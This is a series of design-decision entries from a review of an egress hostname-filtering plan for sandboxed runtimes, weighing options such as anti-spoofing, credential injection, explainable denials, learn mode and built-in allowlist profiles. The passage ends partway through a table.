Project/branch/task: CEO review Section 8, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: The plan already reports whether the gateway is up and has two alerts. When something subtle breaks, though, like sandboxes stuck shut, audit events being dropped, or a node whose self-test fails, an on-call engineer needs a dashboard to look at, a runbook that says what to do, and traces that follow a request from sandboxd into the gateway. This package adds those, plus alerts for stuck attaches and dropped audit events.
Stakes if we pick wrong: the first incident is debugged from raw logs at 3am, or we spend time on dashboards nobody opens.
Recommendation: Full package because a new per-node daemon on the egress path is exactly what on-call will be paged about.
Completeness: A=10/10, B=6/10
Net: operate it with eyes open from day one, or runbooks only.
Header: Operability
A) Full package (recommended)
Grafana panels in `setup/grafana/` (gateway up, sync age, denials by reason, attach failures, held sandboxes, audit drops, proxy connections vs caps, DNS QPS). Runbooks in `setup/runbooks/` for GatewayDown, TableLost, attach failures, audit drops and self-test failure. OTEL trace context carried in UDS frames with spans for Attach, Sync and PUT apply (`internal/observability`). Structured log fields `sandbox_id`, `reason`, `rule`, `mode` on every gateway decision. New alerts `SandboxdEgressAttachFailures` and `SandboxdEgressAuditDropped`. Effort M (human ~3 days / CC ~3h); risk low. ✅ On-call can see and fix gateway problems without reading code ✅ Requests are traceable across the sandboxd/gateway boundary ❌ More dashboard and alert config to maintain
B) Runbooks only
Runbooks for the five failure modes; no dashboard, tracing or new alerts. Effort S (human ~1 day / CC ~1h); risk medium. ✅ Cheapest way to give on-call a playbook ✅ No new config to maintain ❌ Diagnosis still means reading raw metrics and logs

## currentDecision (C-FLAG)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| `SB_EGRESS_FQDN_ENABLED` default | pending (Q8) | `true` (proposed) | `true`: the gateway unit installs and runs everywhere; holds no per-sandbox resources until used | `false`: operator opt-in, like the warm pools; gateway-mode requests get 501 until enabled |

Question: D25 — C-FLAG: Should hostname filtering be on by default on every node, or opt-in per operator?
Project/branch/task: CEO review Section 9, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: The gateway costs almost nothing until a sandbox asks for hostname filtering. On by default means every install can use the feature immediately. Opt-in matches how this repo treats other new subsystems like the warm pools, where an operator flips the switch after checking their hosts pass the node checks (kernel, br_netfilter, no IPv6 on the bridge, not privileged).
Stakes if we pick wrong: on by default can surprise operators with a new running service and 501s on hosts that fail the checks; opt-in means the headline feature is hidden behind a setting.
Recommendation: On by default because it is inert until used, nodes that fail the checks say so with a clear 501, and capability-aware placement (D20) routes around them.
Note: options differ in kind, not coverage — no completeness score.
Net: a feature that works out of the box, or one operators turn on deliberately.
Header: Default flag
A) On by default (recommended)
`SB_EGRESS_FQDN_ENABLED=true`: install.sh, Terraform and Ansible install and start the gateway unit on every node; it holds no per-sandbox resources until a sandbox enters gateway mode. `setup/config-defaults.md` records the rationale. Effort S (human ~1h / CC ~10min); risk low. ✅ Hostname filtering works on a fresh install with no extra step ✅ Failing nodes report a clear 501 and placement avoids them ❌ Every node runs one more service, used or not
B) Opt-in
`SB_EGRESS_FQDN_ENABLED=false` by default; operators enable it after their hosts pass the node checks, matching the warm-pool convention; gateway-mode requests get 501 until then. Effort S (human ~1h / CC ~10min); risk low. ✅ No new running service unless the operator wants it ✅ Matches the repo's existing default-off convention ❌ The headline feature needs a manual step on every deployment

## currentDecision (U1)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| U1 when Firecracker gets egress filtering | user instruction (all runtimes); pending | Phase 4, after the NAT audit | Phase 1, as its own parallel lane: P0-7 fixes Firecracker outbound NAT and adds block-all/CIDR on the TAP device; Phase 1-2 features on Firecracker identified by `iifname fctapN` | Phase 2, after Phase 1 ships on the other four runtimes, with the NAT fix as its prerequisite | Phase 4 as planned |
| Phase 3 inspection and injection on WASM and Firecracker | user instruction; follows from U1 | unspecified | specified for all runtimes that can do it (WASM via the mediator, Firecracker via the gateway, CA bundle injected into the guest) | same as A | unspecified |
| Per-binary rules (P3-3) | CEO D7; physically limited | runc only | runc only (gVisor, Firecracker, WASM and isolate can't expose process identity to the host); runtime matrix says so | same | same |
| E1-E21, X1-X6, R1-R6 | approved | unchanged | unchanged | unchanged | unchanged |

Question: D14 — U1: When should Firecracker get egress filtering, now that the goal is every sandbox type?
Project/branch/task: CEO review, plans/egress-domain-filtering.md (user instruction: all runtimes), branch fix/go-race-coverage-tests.
ELI10: Docker, containerd, gVisor, WASM and isolate all get hostname filtering in Phase 1. Firecracker is parked in Phase 4 because the repo has no outbound network path for Firecracker VMs that we can see, and today its create call rejects every egress setting. Bringing it in means first making Firecracker egress work and be blockable at all, then plugging its network devices into the same gateway, which actually gives a stronger identity than containers because each VM has its own device.
Stakes if we pick wrong: Phase 1 can't merge until the Firecracker lane is green (stacked PRs merge together), or Firecracker users keep getting "not supported" for months.
Recommendation: Phase 1 parity because you asked for every sandbox type, the work runs as its own parallel lane, and each VM's dedicated network device makes it the easiest runtime to identify safely.
Note: options differ in kind, not coverage — no completeness score.
Net: one launch for every runtime, or ship four runtimes first and Firecracker next.
Header: Firecracker
A) Phase 1 parity (recommended)
New P0-7: audit and fix Firecracker outbound NAT in-repo (masquerade and forwarding for the TAP subnet), enforce block-all and CIDR lists on the TAP device, and lift the create gate (`service.go:2137-2145`). Phase 1-2 features then run on Firecracker through the same gateway: identity by `iifname fctapN`, guest DNS pointed at the TAP host IP via `post_resume`/toolboxd, listeners bound with `IP_FREEBIND` behind the input guard. Phase 3 inspection and injection are specified for every runtime that can do them (WASM via the mediator, Firecracker via the gateway, with the CA bundle injected into the guest). Per-binary stays runc-only, as the matrix states. Effort L (human ~3 weeks / CC ~3 days); risk medium-high (the Firecracker network path is barely exercised; warm snapshots restore network state). ✅ One launch covers every sandbox type, as asked ✅ Per-VM TAP devices give unforgeable identity with no anti-spoof work ❌ The whole Phase 1 stack waits on the Firecracker lane before anything merges
B) Phase 2
Same Firecracker work and same Phase 3 runtime coverage, scheduled as Phase 2 items after Phase 1 ships on docker, containerd, gVisor, WASM and isolate. Effort L (same work, later); risk medium. ✅ Phase 1 ships sooner on four runtimes ✅ The Firecracker network fixes get their own review and soak ❌ Firecracker users wait one more phase for filtering
C) Keep Phase 4
Firecracker stays last, after the NAT audit; Phase 3 inspection and injection stay unspecified for WASM and Firecracker. Effort S (zero implementation work now); risk low. ✅ Smallest near-term scope ✅ No dependency on the unexplored Firecracker network path ❌ Doesn't meet the goal of every sandbox type

## currentDecision (R6)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| R6 where `secret_ref` points | pending | a namespace that doesn't exist | a key in the sandbox's own sealed env (`secret_ref: "env:GITHUB_TOKEN"`); the key is withheld from the sandbox and replaced by a placeholder | a new owner-scoped secret object (`PUT /v1/secrets/{name}`) sealed with `pkg/secrets`, 5 SDKs, referenced as `secret_ref: "secret:github"` |
| P3-2 committed (CEO D6, D9) | approved | unchanged | unchanged | unchanged |

Question: D13 — R6: For credential injection, should the secret come from the sandbox's own sealed env, or from a new owner-level secrets store?
Project/branch/task: CEO review spec-review loop, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: Credential injection needs the proxy to find the real secret. The plan said "use the existing owner-scoped secret store", but the reviewer checked and it doesn't exist: today's sealed secrets belong to one sandbox, passed in its env at create. We can either take the secret from that sandbox's own sealed env (keep the key out of the sandbox and give it a placeholder instead), or build a new owner-level store where you save "github" once and many sandboxes reference it.
Stakes if we pick wrong: building a new store adds an API and 5 SDKs to Phase 3; reusing env means each sandbox create must carry the secret again.
Recommendation: Sandbox's sealed env because it reuses the sealing, replication and audit that already exist, and keeps Phase 3 from growing a new top-level API.
Note: options differ in kind, not coverage — no completeness score.
Net: reuse per-sandbox secrets now, or build a shared store E2B-style.
Header: Secret source
A) Sandbox's sealed env (recommended)
`secret_ref: "env:<KEY>"` names a key in the sandbox's own sealed env. When an inject rule references it, sandboxd withholds the real value from the sandbox, sets the env var to a placeholder, and passes the value to the gateway over the UDS for that sandbox only; the gateway keeps it in memory, never in its snapshot. Effort S (human ~2 days / CC ~2h when Phase 3 starts); risk medium. ✅ Reuses existing sealing, replication and audit with no new API ✅ Secret lifetime is bound to the sandbox ❌ Each create must carry the secret; no shared "github" secret across sandboxes
B) New owner-scoped secrets store
New `PUT/GET/DELETE /v1/secrets/{name}` (owner-scoped, sealed with `pkg/secrets`, replicated like other cluster secrets), 5 SDKs and docs; `secret_ref: "secret:<name>"`; values pushed to the gateway per attach over the UDS, memory only. Effort L (human ~2 weeks / CC ~2 days when Phase 3 starts); risk medium. ✅ Save a secret once and reference it from many sandboxes ✅ Rotation in one place reaches every sandbox ❌ A new top-level API, 5 SDKs and cluster replication added to Phase 3

## currentDecision (R1)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| R1 who loses source-IP spoofing ability | pending | only sandboxes with an egress policy (P0-2) | every sandbox: `CAP_NET_RAW` dropped on docker and containerd (closes Q3) | every sandbox: bridge-family nft rule binds each sandbox veth to its IP; `CAP_NET_RAW` kept | unchanged; documented risk |
| P0-2, X1 learn mode | approved | unchanged | unchanged | unchanged | unchanged |

Question: D8 — R1: Stop every sandbox, not just policy ones, from spoofing a neighbour's IP?
Project/branch/task: CEO review spec-review loop, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: The gateway knows sandboxes by IP. Phase 0 removes the raw-packet ability only from sandboxes that have an egress policy, so an ordinary sandbox next door can still send packets that pretend to come from its neighbour. The reviewer showed two concrete abuses: burning a neighbour's DNS rate limit, and planting fake names in a neighbour's learn-mode recording, which the owner then locks in as "allowed". Fixing it means taking the ability away from every sandbox, or binding each sandbox's network port to its own address.
Stakes if we pick wrong: learn mode can be poisoned into allowlisting an attacker's domain, and one sandbox can degrade another's DNS.
Recommendation: Drop raw packets for all because one capability change closes spoofing for every sandbox, and Docker itself recommends dropping it.
Completeness: A=9/10, B=10/10, C=3/10
Net: one simple capability change everywhere, a per-port binding that keeps ping, or accepting a poisonable learn mode.
Header: Anti-spoof
A) Drop raw packets for all (recommended)
Docker and containerd sandboxes drop `CAP_NET_RAW` by default (closes Q3); an opt-in `privileged_network` style escape is not added. EF row: a no-policy sandbox cannot send a spoofed UDP packet. Effort S (human ~3h / CC ~20min); risk medium (ping and raw-socket tools stop working in every sandbox). ✅ Closes spoofing for every sandbox with one change ✅ Learn-mode recordings and DNS budgets can't be tampered with by neighbours ❌ ping and raw-socket tools break for all users, documented in release notes
B) Per-port address binding
A bridge-family nftables table holds a set of (veth interface, IP) pairs for every sandbox, maintained at attach and detach, dropping frames whose source IP doesn't match their veth. `CAP_NET_RAW` stays. EF row as in A plus ping still works. Effort M (human ~3 days / CC ~4h); risk medium (veth discovery differs per engine; another set to keep in sync on IP reuse). ✅ Identity bound to the network port regardless of capabilities ✅ ping and raw-socket tools keep working ❌ One more kernel set per node to keep exactly in sync with IP reuse
C) Keep Phase 0 as is
Only policy sandboxes lose `CAP_NET_RAW`; document that learn mode and DNS budgets can be influenced by spoofing neighbours. Effort S (zero implementation work); risk high. ✅ No behavior change for sandboxes without policies ✅ No new kernel state ❌ Learn mode can be poisoned into allowlisting an attacker-chosen domain

## currentDecision (R2)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| R2 Phase 3 contract | pending | committed items, no contract | Phase 3 (inspection, credential injection, per-binary) gets its own plan and eng review before build; this plan keeps a short outline | §5.9 gains the full contract now (secret_ref namespace, placeholder delivery, header replace vs substitute, audit redaction, CA trust after recreate, per-binary field shape) plus EF rows and tasks |
| X5, X6 commitments | approved | unchanged | unchanged | unchanged |

Question: D9 — R2: Should Phase 3 get its own plan and eng review, or be fully specified in this plan now?
Project/branch/task: CEO review spec-review loop, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: You committed credential injection and per-binary rules to Phase 3, but the plan only sketches them. The reviewer found a dozen open design questions: where secrets come from, how placeholders get into the sandbox, how the CA is trusted after a failover, what a per-binary rule looks like. We can answer them now, or say plainly that Phase 3 gets its own plan and engineering review before anyone builds it. Phase 3 is gated on demand either way.
Stakes if we pick wrong: designing now may go stale before Phase 3 starts; deferring the design means the commitment has no contract until then.
Recommendation: Own plan and eng review because Phase 3 waits for demand and depends on what Phase 1 and 2 teach us, so a contract written today would likely be rewritten.
Note: options differ in kind, not coverage — no completeness score.
Net: design when it is about to be built, or lock the contract today.
Header: Phase 3 plan
A) Own plan and eng review (recommended)
Both documents state that Phase 3 (P3-1 inspection, P3-2 credential injection, P3-3 per-binary rules) gets its own plan and eng review before build. This plan keeps a short outline listing the reviewer's open questions as that plan's required inputs. Effort S (human ~1h / CC ~10min); risk low. ✅ Design happens with Phase 1-2 lessons in hand ✅ The open questions are recorded so nothing is lost ❌ The commitment has no buildable contract until that review
B) Full contract now
§5.9 specifies: `secret_ref` uses the existing sealed-secrets store; placeholders delivered as env values; the header is replaced, not substituted inside bodies; audit records redact injected values; the per-node CA is re-trusted on recreate by re-mounting the bundle; per-binary rules are `binaries: [path]` on runc only. EF rows and tasks added. Effort M (human ~2 days / CC ~3h); risk medium (design may go stale before build). ✅ Phase 3 is buildable from this plan alone ✅ No second planning round later ❌ Locks TLS-interception design before real demand or Phase 1-2 lessons

## currentDecision (R3)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| R3 denials that explain themselves | pending | DNS (EDE 15), :80 (403), :443 (TLS alert) | same three; Vision and docs say "DNS, HTTP and HTTPS denials explain themselves; other drops are audited" | also: forward-chain drops for FQDN sources use nft `reject` (TCP reset, ICMP admin-prohibited) so connects fail fast; QPS cap answers REFUSED with EDE 15; `conn_cap` closes after a TLS `access_denied` alert; WASM mediator returns a typed error naming host and rule; isolate's 403 body names host and rule |
| X3 (P1-13) | approved | unchanged | unchanged | unchanged |

Question: D10 — R3: Should every kind of denial fail fast with a reason, or only DNS, HTTP and HTTPS?
Project/branch/task: CEO review spec-review loop, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: The accepted add-on explains denials for DNS, plain HTTP and HTTPS. Everything else still fails silently: a connection to a raw IP or an unlisted port just hangs until it times out (often over a minute), and the WASM and isolate runtimes return generic errors. We can either say honestly that only those three explain themselves, or make the rest fail fast with a reason too, mostly by rejecting instead of silently dropping packets.
Stakes if we pick wrong: agents waiting a minute per blocked connect waste time and retry blindly; or the docs promise "every denial explains itself" when it doesn't.
Recommendation: Fail fast everywhere because rejecting instead of dropping turns minute-long hangs into instant errors at little extra cost.
Completeness: A=6/10, B=10/10
Net: honest narrow claim, or instant feedback on every blocked path.
Header: Fail fast
A) Narrow the claim
Keep P1-13 as is. The CEO summary Vision and the docs say "DNS, HTTP and HTTPS denials explain themselves; other drops are silent and audited". Effort S (zero implementation work); risk low. ✅ No new behavior to build or test ✅ Claims match the implementation exactly ❌ Raw-IP and other-port connects still hang until timeout
B) Fail fast everywhere (recommended)
Extend P1-13: forward-chain drops for FQDN sources become nft `reject` (TCP reset; ICMP admin-prohibited for UDP); QPS-capped queries get REFUSED with EDE 15; `conn_cap` closes after a TLS `access_denied` alert; the WASM mediator returns a typed error naming host and rule; isolate's 403 body names host and rule. EF rows for each. Effort M (human ~2 days / CC ~2h); risk low. ✅ Every blocked path fails instantly with a reason ✅ Agents stop burning minutes on timeouts ❌ Reject reveals filtering on more paths (no policy content beyond the refused host)

## currentDecision (R4)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B |
|---|---|---|---|---|
| R4 built-in profile versioning | pending | unspecified | resolved when policy is applied (attach, reconcile, Sync) from the node's catalogue; catalogue version recorded in audit; names `builtin:<name>` | catalogue version pinned in the sandbox spec at create; a sandbox keeps that version until its policy is updated; names `builtin:<name>@<version>` |
| X2 (P2-8) | approved | unchanged | unchanged | unchanged |

Question: D11 — R4: When AerolVM updates a built-in profile (say pypi adds a host), should running sandboxes get the new list?
Project/branch/task: CEO review spec-review loop, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: Built-in lists like "pypi" will change as registries move their downloads around. If sandboxes always use the list shipped with the node's current AerolVM version, an upgrade quietly fixes broken installs, but it also changes a running sandbox's policy without anyone asking. If each sandbox pins the version it was created with, nothing changes underneath it, but a stale list keeps failing until the user updates the policy.
Stakes if we pick wrong: either upgrades silently change what sandboxes can reach, or stale lists keep breaking installs after a fix has shipped.
Recommendation: Resolve at apply time because these lists only exist to make tools work, and a fix should reach users without each one re-applying policies.
Note: options differ in kind, not coverage — no completeness score.
Net: automatic fixes with silent policy changes, against stable policies that stay broken.
Header: Profile versions
A) Resolve at apply time (recommended)
`builtin:<name>` resolves from the node's catalogue whenever policy is applied (attach, reconcile, Sync). The catalogue version is recorded in each audit event and in the GET response. Mixed-version clusters may briefly differ during rolling upgrades, which is documented. Effort S (human ~3h / CC ~20min); risk low. ✅ List fixes reach every sandbox on upgrade with no user action ✅ Simple names, no version strings for users to manage ❌ An upgrade can widen what a running sandbox may reach without the owner acting
B) Pin at create
The sandbox spec stores `builtin:<name>@<version>`; the node keeps every catalogue version it has shipped; users move to a newer list by updating the policy. Effort M (human ~2 days / CC ~2h); risk low. ✅ A sandbox's reachable hosts never change without its owner acting ✅ Reproducible policies across upgrades and failovers ❌ Stale lists keep breaking installs until each owner updates

## currentDecision (R5)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| R5 keeping built-in profiles fresh | pending | operator-run integration UCs only (EF-49) | weekly scheduled GitHub Actions job runs each profile's real tool behind the egress gateway on the runner and opens an issue on failure (not a merge gate) | operator-run EF-49 only | weekly CI job that only checks each profile hostname still resolves |
| X2 (P2-8), EF-49 | approved | unchanged | unchanged | unchanged | unchanged |

Question: D12 — R5: How should built-in profile lists be kept from going stale?
Project/branch/task: CEO review spec-review loop, plans/egress-domain-filtering.md, branch fix/go-race-coverage-tests.
ELI10: A built-in "pypi" list is only useful if it still works. The plan tests each list by actually running pip, npm and so on, but only in the AWS integration suite that operators run by hand. A registry could change its download hosts and nobody would notice until users' installs fail. A weekly scheduled job in CI could run each tool through the filter and open an issue when one breaks; it is not a merge gate.
Stakes if we pick wrong: stale lists reach users as "AerolVM broke pip", or we pay for a weekly job that rarely finds anything.
Recommendation: Weekly CI job because the lists exist to just work, and a scheduled run catches drift before users do without blocking merges.
Completeness: A=10/10, B=5/10, C=6/10
Net: catch drift weekly, rely on manual runs, or a cheap partial check.
Header: Profile drift
A) Weekly CI job (recommended)
A scheduled GitHub Actions workflow (weekly, not a merge gate) builds sandboxd, runs the egress gateway on the runner with nftables, and for each built-in profile runs its real tool (pip, npm, git, huggingface-cli, go, cargo, apt, crane) through FQDN mode; failures open a GitHub issue naming the profile. Effort M (human ~2 days / CC ~3h); risk low. ✅ Catches registry drift within a week, before most users hit it ✅ Not a merge gate, consistent with the advisory-CI policy ❌ A weekly job to keep green, with real network flakiness
B) Operator-run only
Keep EF-49 in the AWS integration suite only; no schedule. Effort S (zero implementation work); risk medium. ✅ No new CI workflow ✅ No flaky network job to maintain ❌ Drift is found by users before operators
C) DNS check only
A weekly CI job checks that every hostname in every profile still resolves; it does not run the tools. Effort S (human ~3h / CC ~20min); risk medium. ✅ Cheap and rarely flaky ✅ Catches deleted hostnames ❌ Misses the common case: a registry adding a new download host

**0H document approval:** CEO D15 answer "Approve these documents"
(2026-10-06). It approves this plan version and the CEO summary
(`~/.gstack/projects/aerol-ai-microvm/ceo-plans/2026-10-06-egress-domain-filtering.md`)
as written, with the 30 spec-review-3 issues kept under the summary's
"Reviewer Concerns" (C1-C13, K1-K5, L1-L6, S1-S2, F1-F3). Spec-review metrics:
3 iterations, 86 issues found, 0 reviewer-confirmed fixes, 30 remaining,
latest score 5/10.

**0I. Temporal interrogation.**

```
  HOUR 1 (foundations):  pkg/egresspolicy grammar (precedence, caps, ports), internal/netsplice
                         extraction, the nft table layout as real sets, the egress-gateway
                         process skeleton + UDS protocol (N/N-1), Phase 0 fixes in one stack.
  HOUR 2-3 (core logic): the BlockAll hold vs quota code (C1/C2), Attach carrying blocked state,
                         Sync payload + snapshot ordering (C10), learn and default-verdict sets (L2),
                         port semantics on WASM/isolate (L3).
  HOUR 4-5 (integration): self-test on a fresh containerd node (F1), br_netfilter for east-west (C6),
                         dedicated workers without an FSM (profile cache), warm-pool eligibility (C13),
                         docker user-defined networks (Q10).
  HOUR 6+ (polish/tests): missing EF rows (C12), auditing nft rejects (C9), IPv6 fail-closed (C8),
                         N-1 protocol tests, the 3-engine integration runs (D16).
```

Effort, Phases 0-2: human ~10-12 weeks, CC + gstack ~2 weeks. Phase 3: human
~9 weeks, CC ~2 weeks, when demand opens it.

Scope and feasibility blockers found in 0I are each resolved without a new
question:
- **S1/K4** (P3-3 narrowed to proxied flows): restored to the approved X6 scope,
  with forwarded flows refused at `connect()` by eBPF cgroup connect hooks on
  runc. This adds a new dependency (cilium/ebpf is not in go.mod), which the
  PR calls out.
- **S2** (CA bundle in every gateway sandbox): reverted to the approved R2
  scope; the bundle is mounted only for sandboxes with inspect rules.
- **F1** (self-test on a fresh node): a repair needed for G7.

Their exact amendments land in Section 1. Other design choices stay pending
into the review sections.

## currentDecision (X1)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| X1 learn mode | pending | not in plan | Add as Phase 2 item P2-7 | TODOS.md entry | not planned; NOT in scope |
| E1-E21, M1 | approved | unchanged | unchanged | unchanged | unchanged |

Question: D2 — X1: Add a learn mode that records what a sandbox reaches and turns it into an allowlist?
Project/branch/task: CEO review of plans/egress-domain-filtering.md (SELECTIVE EXPANSION), branch fix/go-race-coverage-tests.
ELI10: The hardest part of an allowlist is knowing what to put in it: pip alone needs pypi.org and files.pythonhosted.org, and GitHub needs several hostnames. Learn mode runs a trusted sandbox with egress open but recorded, then hands back the exact list of names and ports it used, ready to apply as a policy or save as a profile. You go from "guess and break" to "record, review, lock".
Stakes if we pick wrong: without it, users write allowlists by trial and error and blame the feature when installs fail; with it, a misused learn mode is an open sandbox.
Recommendation: Add because it turns the hardest step of adopting allowlists into one API call, and it reuses the DNS filter, proxy and audit records the plan already builds.
Note: options differ in kind, not coverage — no completeness score.
Net: tooling that writes the allowlist for you, against one more mode and API to keep honest.
Header: Learn mode
A) Add to this plan's scope (recommended)
New Phase 2 item P2-7: create or PUT with `network_egress_mode: "learn"` attaches the sandbox with allow-all but records every DNS name, SNI/Host and port. `GET /v1/sandboxes/{id}/network/learned` returns a suggested `allow_out` (wildcards where a domain has many subdomains), which can be applied with PUT or saved as a named profile (D21). Effort M (human ~4 days / CC ~4h); risk low (never a default, labeled in audit). Reuses the DNS filter, proxy and audit; tests: learned list round-trips into a policy that lets the same workload pass. ✅ Turns allowlist authoring into record-review-lock, the biggest adoption barrier ✅ Mostly reuses records the gateway already writes ❌ Adds an API, a mode and SDK surface in 5 languages
B) Defer to TODOS.md
Add a TODOS.md entry (What/Why/Context, depends on Phase 2 PUT and profiles) and keep this plan unchanged. Effort S (zero implementation work now); risk low. ✅ No scope growth before Phase 1 ships ✅ Captured for when allowlist friction shows up in practice ❌ Users write allowlists by trial and error until then
C) Skip
Not planned; recorded in NOT in scope with the reason. Effort S (zero implementation work); risk low. ✅ Smallest API surface ✅ No open-egress mode exists that someone could misuse ❌ Allowlist authoring stays the main adoption barrier with no tooling

## currentDecision (X2)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| X2 curated built-in profiles | pending | not in plan | Add as Phase 2 item P2-8 | TODOS.md entry | not planned |
| D21 named profiles (E20) | approved | unchanged | unchanged | unchanged | unchanged |

Question: D3 — X2: Ship curated built-in egress profiles (pypi, npm, GitHub, Hugging Face, apt) on top of named profiles?
Project/branch/task: CEO review of plans/egress-domain-filtering.md (SELECTIVE EXPANSION), branch fix/go-race-coverage-tests.
ELI10: Named profiles (approved in D21) let you store a list once. Built-in profiles go one step further: AerolVM ships ready-made lists like "pypi" or "github" that already contain every hostname those tools need, kept up to date in the repo and tested by actually running pip install or git clone. One word in the create call gives a working allowlist.
Stakes if we pick wrong: shipping them means maintaining lists that drift when registries change CDNs; skipping them leaves every user to rediscover the same hostnames.
Recommendation: Add because it is small on top of D21, and a tested "pypi" profile removes the most common allowlist failure.
Note: options differ in kind, not coverage — no completeness score.
Net: tested ready-made lists, against owning their upkeep as registries change.
Header: Built-in lists
A) Add to this plan's scope (recommended)
New Phase 2 item P2-8: a versioned catalogue of built-in profiles in `pkg/egresspolicy` (pypi, npm, github, huggingface, golang-proxy, crates, apt-ubuntu, docker-hub), usable anywhere a named profile is. Each has an integration UC that runs the real tool (pip install, npm install, git clone…) through FQDN mode. Effort S (human ~2 days / CC ~2h); risk low (a stale list fails closed). ✅ One word gives a working, tested allowlist for the common cases ✅ Integration UCs catch registry CDN changes before users do ❌ Lists need upkeep when registries move hosts
B) Defer to TODOS.md
TODOS.md entry (depends on P2-6 named profiles); plan unchanged. Effort S (zero implementation work now); risk low. ✅ Waits until named profiles exist and real usage shows which lists matter ✅ No list maintenance yet ❌ Every user rediscovers registry hostnames on their own
C) Skip
Not planned; NOT in scope with the reason. Effort S (zero implementation work); risk low. ✅ No catalogue to maintain ✅ Keeps profiles purely user-defined ❌ The most common allowlist mistakes stay common

## currentDecision (X3)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| X3 explainable denials | pending | denial audited only (H5) | Add to Phase 1 (P1-13) | TODOS.md entry | not planned |
| H5 denied-egress audit, D6 outer SNI | approved | unchanged | unchanged | unchanged | unchanged |

Question: D4 — X3: Make denials explain themselves to the sandbox (DNS "Blocked" error, HTTP 403 body, TLS access_denied)?
Project/branch/task: CEO review of plans/egress-domain-filtering.md (SELECTIVE EXPANSION), branch fix/go-race-coverage-tests.
ELI10: Today the plan blocks quietly: a denied name just doesn't exist, and a denied HTTPS connection just drops. An agent or developer then sees a confusing timeout or "host not found" and has no idea the policy did it. This add-on makes every denial say so: DNS answers carry the standard "Blocked" extended error with the reason, plain HTTP gets a 403 page naming the rule, and HTTPS gets a TLS "access denied" alert instead of a hang.
Stakes if we pick wrong: without it, the first experience of a working filter looks like a broken network, and agents retry blindly.
Recommendation: Add because it is small, uses support the DNS library already has, and turns every denial from a mystery into a message.
Note: options differ in kind, not coverage — no completeness score.
Net: a filter that explains itself, at the cost of telling sandboxed code what was refused.
Header: Explain denials
A) Add to this plan's scope (recommended)
New Phase 1 item P1-13: the DNS filter adds RFC 8914 Extended DNS Error 15 "Blocked" with extra text `aerolvm egress policy: <name> not allowed` (miekg/dns v1.1.73 supports EDE). Port 80 returns a 403 whose body names the host and rule. Port 443 sends a TLS `access_denied` alert before closing. The docs gain a troubleshooting section using `GET /v1/sandboxes/{id}/audit` to list denials. Effort S (human ~1 day / CC ~1h); risk low. Tests: `dig` shows EDE 15; `curl http://` shows the 403 body; `curl https://` reports the alert. ✅ Denials read as policy messages, not network faults ✅ Agents can stop retrying and ask for access ❌ Reveals the policy decision to code in the sandbox (names only, no other policy content)
B) Defer to TODOS.md
TODOS.md entry; Phase 1 keeps silent denials plus audit records. Effort S (zero implementation work now); risk low. ✅ Phase 1 stays exactly as approved ✅ Audit already records each denial for operators ❌ Users and agents see timeouts and "not found" with no hint
C) Skip
Not planned; NOT in scope with the reason. Effort S (zero implementation work); risk low. ✅ Reveals nothing about the policy to sandboxed code ✅ No extra protocol handling in the proxy ❌ Every denial looks like a broken network

## currentDecision (X4)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| X4 policy check endpoint | pending | not in plan | Add as Phase 2 item P2-9 | TODOS.md entry | not planned |

Question: D5 — X4: Add a dry-run endpoint that answers "would this policy allow this host?"
Project/branch/task: CEO review of plans/egress-domain-filtering.md (SELECTIVE EXPANSION), branch fix/go-race-coverage-tests.
ELI10: Policy authors and agent frameworks often want to test a rule before creating a sandbox: "if I allow *.github.com, does api.github.com pass? Does github.com?" A small endpoint could run the shared matcher and answer with the deciding rule. Per the repo rules, every new endpoint also needs all five SDKs and docs, so it is bigger than the matcher call it wraps.
Stakes if we pick wrong: adding it grows the API surface for a convenience; skipping it means people learn the wildcard rules by trial.
Recommendation: Defer to TODOS.md because the matcher is a pure function users can reason about from the docs, and five SDKs for a convenience can wait for demand.
Note: options differ in kind, not coverage — no completeness score.
Net: a handy testing tool, against five SDKs of API surface before anyone asks.
Header: Policy check
A) Add to this plan's scope
New Phase 2 item P2-9: `POST /v1/network/policy/check {network_allow_out, network_deny_out, destination}` returns `{allowed, matched_rule, default_verdict}` from `pkg/egresspolicy`, with 5 SDK methods and docs. Effort M (human ~2 days / CC ~2h); risk low. Tests: table cases mirroring the matcher's. ✅ Lets authors and agent frameworks test rules before creating a sandbox ✅ Pure function, so it is easy to test and has no side effects ❌ New endpoint plus five SDKs and docs for a convenience
B) Defer to TODOS.md (recommended)
TODOS.md entry (What/Why/Context, start at `pkg/egresspolicy`); plan unchanged. Effort S (zero implementation work now); risk low. ✅ No new API surface before anyone asks ✅ The docs' precedence and wildcard table answers most questions ❌ Authors test rules by creating real sandboxes until it exists
C) Skip
Not planned; NOT in scope with the reason. Effort S (zero implementation work); risk low. ✅ Smallest API surface ✅ Nothing to keep in sync with the matcher ❌ No way to test a rule without a sandbox

## currentDecision (X5)
Commitment comparison:

| Commitment | Source/approval or pending | Current | A | B | C |
|---|---|---|---|---|---|
| X5 credential injection | pending | "optional" line in §5.9 Phase 3 sketch | committed Phase 3 deliverable (still demand-gated with Phase 3) | TODOS.md entry; §5.9 line stays optional | removed from §5.9; NOT in scope |
